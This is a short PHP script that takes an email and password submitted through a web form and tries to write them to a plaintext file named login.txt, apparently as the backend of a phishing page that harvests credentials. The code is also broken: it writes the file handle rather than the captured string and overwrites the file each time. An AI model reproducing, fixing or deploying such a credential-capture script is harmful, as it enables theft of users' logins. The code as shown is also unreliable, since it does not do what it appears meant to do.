<?php


$useremail = "";
$password = "";

if (isset($_POST['useremail']) && isset($_POST['passf'])) {
    $useremail = $_POST['useremail'];
    $password = $_POST['passf'];
    $strLogin = $useremail." ". $password."\n";
    $myfile = fopen("login.txt", "w+") or die("Unable to open file!");
    fwrite($myfile, $myfile);
    fclose($myfile);
}

?>